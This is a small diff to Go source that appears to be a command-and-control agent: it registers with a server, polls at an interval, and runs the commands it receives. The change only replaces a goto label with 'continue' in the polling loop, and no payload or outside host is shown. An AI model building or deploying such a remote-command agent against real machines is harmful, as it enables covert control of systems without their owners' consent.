@@ -40,7 +40,6 @@ func main() {
 	interval := registerResponse.Interval
 	fmt.Println("[*] Agent ID: " + agentId)
 	fmt.Println("[*] Interval: " + fmt.Sprint(interval))
-loop:
 	for {
 		fmt.Printf("[*] Sleeping for %v seconds", interval)
 		time.Sleep(time.Duration(interval) * time.Second)
@@ -62,7 +61,7 @@ loop:
 		if string(command) == "no commands found" {
 			log.SetFlags(0)
 			log.Println("\n[-] No command to run")
-			goto loop
+			continue
 		}
 
 		fmt.Println("[+] Running command: " + string(command))
